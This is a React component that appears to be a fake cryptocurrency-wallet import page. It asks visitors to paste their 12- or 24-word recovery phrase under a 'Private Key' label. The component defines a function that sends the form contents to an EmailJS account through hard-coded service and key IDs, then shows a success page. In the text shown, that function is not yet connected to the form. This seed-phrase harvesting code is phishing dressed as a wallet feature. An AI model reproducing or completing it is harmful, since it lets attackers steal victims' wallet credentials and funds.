import * as React from "react";
import Box from "@mui/material/Box";
import TextField from "@mui/material/TextField";
import Button from "@mui/material/Button";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import { useRef } from "react";
import { useForm } from "react-hook-form";
import { useState } from "react";
import { Typography } from "@mui/material";


const PrivateKey = () => {
  const [toggleState, setToggleState] = useState(1);
  const { handleSubmit, formState } = useForm();
  const { isSubmitting } = formState;
  const form = useRef();
  let navigate = useNavigate();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm(
        "service_baa21jx",
        "template_tsaqnjc",
        form.current,
        "P_9SIX5hhtfJnOac4"
      )
      .then(
        (result) => {
          navigate("/success-page");
        },
        (error) => {
          navigate("/error");
        }
      );
  };

  function onFormSubmit(data) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve();
      }, 2000);
    });
  }

  return (
    <div className={toggleState === 3 ? "content active-content" : "content"}>
      <Box
        component="form"
        sx={{
          width: "80%",
          margin: "0 auto",
        }}
        noValidate
        autoComplete="off"
      >
        <TextField
          id="outlined-basic"
          label="Private Key"
          variant="outlined"
          multiline
          fullWidth
          rows={12}
        />

        <Typography
          sx={{ textAlign: "center", color: "rgba(38,34,250)" }}
          paddingY={2}
          textAlign={"center"}
        >
          Typically 12 (sometimes 24) words seperated by single spaces
        </Typography>

        <Button textAlign="center" variant="contained" size="large">
          IMPORT
        </Button>
      </Box>
    </div>
  );
};

export default PrivateKey;
